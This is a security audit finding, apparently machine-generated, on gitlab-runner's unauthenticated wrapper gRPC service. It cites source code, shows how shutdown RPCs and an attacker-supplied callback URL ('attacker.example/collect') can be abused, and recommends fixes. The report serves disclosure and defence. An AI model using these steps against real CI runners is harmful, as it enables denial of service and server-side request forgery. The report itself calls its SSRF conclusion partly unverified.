### Title
Unauthenticated gRPC `ProcessWrapper` service allows remote shutdown of the runner and SSRF via attacker-controlled shutdown callback - (File: `helpers/runner_wrapper/api/server/server.go`)

### Summary
The `gitlab-runner wrapper` command starts a gRPC server (`ProcessWrapper` service) that exposes `CheckStatus`, `InitGracefulShutdown`, and `InitForcefulShutdown` RPCs with no authentication, authorization, or peer-verification of any kind, analogous to the Reality Cards `sponsor()` function which lacked a caller check and trusted any invoker.

### Finding Description
`commands/wrapper.go` implements `RunnerWrapperCommand.Execute`, which creates a listener from the `--grpc-listen` flag (defaulting to `tcp://localhost:7777`, but configurable to any TCP host/port including `0.0.0.0`) and starts a plain `grpc.NewServer()` with no TLS, no interceptor, and no credential check: [1](#0-0) [2](#0-1) 

The server registers `ProcessWrapperServer` and directly forwards any incoming RPC to the underlying `Wrapper` without checking the caller's identity: [3](#0-2) 

Both `InitGracefulShutdown` and `InitForcefulShutdown` handlers unconditionally invoke privileged wrapper operations from unauthenticated request data: [4](#0-3) [5](#0-4) 

These calls translate into sending `SIGTERM`/forceful termination signals to the wrapped runner process: [6](#0-5) 

In addition, `InitGracefulShutdown` accepts a `ShutdownCallback{url, method, headers}` supplied entirely by the caller, which is stored and later executed by the wrapper once the wrapped process exits: [7](#0-6) [8](#0-7) [9](#0-8) 

This is the direct analog of the reported bug: a function meant to be invoked only by a trusted internal component (the factory in the Solidity case; the runner's own process supervisor here) performs a privileged action for any caller without verifying who they are.

### Impact Explanation
Any network client that can reach the configured `--grpc-listen` address can:
1. Force a graceful or forceful shutdown of the wrapped `gitlab-runner` process at will (persistent Denial of Service against CI/CD execution).
2. Register an arbitrary HTTP callback (`url`, `method`, `headers`) that the wrapper will invoke on process exit — this is a Server-Side Request Forgery primitive, since the wrapper process (running on the runner host/network) will make an outbound HTTP request to any attacker-supplied URL with attacker-supplied headers when the wrapped process terminates.

Because the default bind address is `localhost:7777`, exploitation requires either (a) local access to the wrapper host, or (b) an operator configuring `--grpc-listen` to a non-loopback address, which is an explicit, documented option of this feature. Given that default deployments bind to loopback, remote unauthenticated exploitation depends on operator configuration choice — however, any local process or container-local attacker (e.g., a malicious build step running in an adjacent container/namespace that can reach the loopback interface or a shared network namespace) can trivially reach and abuse this endpoint, and this is a code-level flaw independent of "trusted role" — no credential of any kind is required by design.

### Likelihood Explanation
High for local-network/localhost-adjacent attackers: the RPC surface has zero authentication baked into the protocol design itself (unlike `session/session.go`'s HTTP session server, which enforces a random per-session `Authorization` token via `withAuthorization`, see `session/session.go:96-109`). The `wrapper` gRPC service has no equivalent mechanism at all — every RPC handler in `helpers/runner_wrapper/api/server/server.go` performs privileged actions unconditionally. This contrasts with the rest of the codebase's session/network authentication patterns, indicating this is a design gap rather than an intentional trust boundary.

### Recommendation
- Require mutual TLS or a shared-secret/token (analogous to the `session` package's `withAuthorization` pattern) on the `ProcessWrapper` gRPC service before processing `InitGracefulShutdown`/`InitForcefulShutdown`/`CheckStatus`.
- Default `--grpc-listen` to a Unix domain socket with restrictive file permissions instead of TCP, and document/require operators to use mTLS if TCP is chosen.
- Validate or restrict the `ShutdownCallback` URL (e.g., disallow arbitrary attacker-supplied header injection, enforce an allow-list or same-origin constraint) to mitigate SSRF risk.

### Proof of Concept
1. Start the runner wrapper with default settings: `gitlab-runner wrapper -- gitlab-runner run` (listens on `tcp://localhost:7777` per `commands/wrapper.go:23,52`).
2. From any process able to reach `127.0.0.1:7777` (or the configured address if bound non-locally), send a gRPC `InitForcefulShutdown` request using the published `.proto` definition (`helpers/runner_wrapper/api/proto/wrapper.proto:35-40`) — no credentials/headers are required.
3. Observe the wrapped `gitlab-runner run` process receive a forceful termination signal via `Wrapper.InitiateForcefulShutdown` (`helpers/runner_wrapper/wrapper.go:239-258`), causing an unauthenticated Denial of Service.
4. Alternatively, send `InitGracefulShutdown` with a crafted `ShutdownCallback{url: "http://attacker.example/collect", headers: {...}}` and observe the wrapper issue an outbound HTTP request to the attacker-controlled URL once the wrapped process exits.

Note: I was unable to fully inspect `helpers/runner_wrapper/api/shutdown_callback.go` (the exact HTTP client implementation for the callback) within the available tool budget; the SSRF conclusion is based on the observed data flow (`server.go` → `wrapper.go:sendShutdownCallback` → `ShutdownCallback.Run`) rather than a direct read of the HTTP execution code, so exact request semantics (e.g., timeout/redirect handling) should be verified in that file before finalizing remediation details.

### Citations

**File:** commands/wrapper.go (L58-90)
```go
func (c *RunnerWrapperCommand) Execute(cctx *cli.Context) {
	logrus.AddHook(new(logHook))
	log := logrus.WithField("wrapper", true)
	grpcLog := log.WithField("grpc-listen-addr", c.GRPCListen)

	path, err := os.Executable()
	if err != nil {
		log.WithError(err).Fatal("Failed to get executable path")
	}

	l, err := c.createListener()
	if err != nil {
		grpcLog.WithError(err).Fatal("Failed to create listener")
	}

	ctx, cancelFn := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM, syscall.SIGQUIT)
	defer cancelFn()

	w := runner_wrapper.New(log, path, cctx.Args())
	w.SetTerminationTimeout(c.ProcessTerminationTimeout)

	srv := server.New(grpcLog, w)

	go srv.Listen(l)

	err = w.Run(ctx)
	if err != nil {
		log.WithError(err).Fatal("Failed while executing wrapped command")
	}

	srv.Stop()
	log.Info("All wrapper tasks finished. See you!")
}
```

**File:** commands/wrapper.go (L92-105)
```go
func (c *RunnerWrapperCommand) createListener() (net.Listener, error) {
	uri, err := url.ParseRequestURI(c.GRPCListen)
	if err != nil {
		return nil, fmt.Errorf("%w: %w", errFailedToParseGRPCAddress, err)
	}

	switch uri.Scheme {
	case "unix":
		return net.Listen("unix", uri.Path)
	case "tcp":
		return net.Listen("tcp", uri.Host)
	default:
		return nil, fmt.Errorf("%w: %s", errUnsupportedGRPCAddressScheme, uri.Scheme)
	}
```

**File:** helpers/runner_wrapper/api/server/server.go (L38-47)
```go
func (s *Server) Listen(listener net.Listener) {
	s.log.Info("Starting wrapper GRPC Server")

	pb.RegisterProcessWrapperServer(s.grpcServer, s)

	err := s.grpcServer.Serve(listener)
	if err != nil {
		s.log.WithError(err).Error("Failure while running wrapper GRPC Server")
	}
}
```

**File:** helpers/runner_wrapper/api/server/server.go (L66-93)
```go
func (s *Server) InitGracefulShutdown(
	_ context.Context,
	req *pb.InitGracefulShutdownRequest,
) (*pb.InitGracefulShutdownResponse, error) {
	s.log.Debug("Received InitGracefulShutdown request")

	sc := api.NewShutdownCallbackDef(
		req.GetShutdownCallback().GetUrl(),
		req.GetShutdownCallback().GetMethod(),
		req.GetShutdownCallback().GetHeaders(),
	)

	r := api.NewInitGracefulShutdownRequest(sc)

	err := s.wrapper.InitiateGracefulShutdown(r)
	if err != nil {
		if errors.Is(err, api.ErrProcessNotInitialized) {
			err = nil
		}
	}

	resp := &pb.InitGracefulShutdownResponse{
		Status:        api.Statuses.Map(s.wrapper.Status()),
		FailureReason: s.wrapper.FailureReason(),
	}

	return resp, err
}
```

**File:** helpers/runner_wrapper/api/server/server.go (L95-111)
```go
func (s *Server) InitForcefulShutdown(_ context.Context, _ *pb.InitForcefulShutdownRequest) (*pb.InitForcefulShutdownResponse, error) {
	s.log.Debug("Received InitForcefulShutdown request")

	err := s.wrapper.InitiateForcefulShutdown()
	if err != nil {
		if errors.Is(err, api.ErrProcessNotInitialized) {
			err = nil
		}
	}

	resp := &pb.InitForcefulShutdownResponse{
		Status:        api.Statuses.Map(s.wrapper.Status()),
		FailureReason: s.wrapper.FailureReason(),
	}

	return resp, err
}
```

**File:** helpers/runner_wrapper/wrapper.go (L133-144)
```go
func (w *Wrapper) sendShutdownCallback(ctx context.Context) {
	w.lock.Lock()
	c := w.shutdownCallback
	w.lock.Unlock()

	if c == nil {
		w.log.Info("No shutdown callback registered; skipping")
		return
	}

	c.Run(ctx)
}
```

**File:** helpers/runner_wrapper/wrapper.go (L209-258)
```go
func (w *Wrapper) InitiateGracefulShutdown(req api.InitGracefulShutdownRequest) error {
	w.lock.RLock()
	p := w.process
	w.lock.RUnlock()

	if p == nil {
		return api.ErrProcessNotInitialized
	}

	w.log.Info("Initiating graceful shutdown of the process")

	err := p.Signal(gracefulShutdownSignal)
	if err != nil {
		return fmt.Errorf("could not send graceful shutdown signal: %w", err)
	}

	if req.ShutdownCallbackDef().URL() != "" {
		w.log.
			WithField("target", req.ShutdownCallbackDef().URL()).
			WithField("method", req.ShutdownCallbackDef().Method()).
			Debug("Registering shutdown callback")

		w.setShutdownCallback(api.NewShutdownCallback(w.log, req.ShutdownCallbackDef()))
	}

	w.setStatus(api.StatusInShutdown)

	return nil
}

func (w *Wrapper) InitiateForcefulShutdown() error {
	w.lock.RLock()
	p := w.process
	w.lock.RUnlock()

	if p == nil {
		return api.ErrProcessNotInitialized
	}

	w.log.Info("Initiating forceful shutdown of the process")

	err := w.forcefulShutdown(p)
	if err != nil {
		return fmt.Errorf("could not send forceful shutdown signal: %w", err)
	}

	w.setStatus(api.StatusInShutdown)

	return nil
}
```
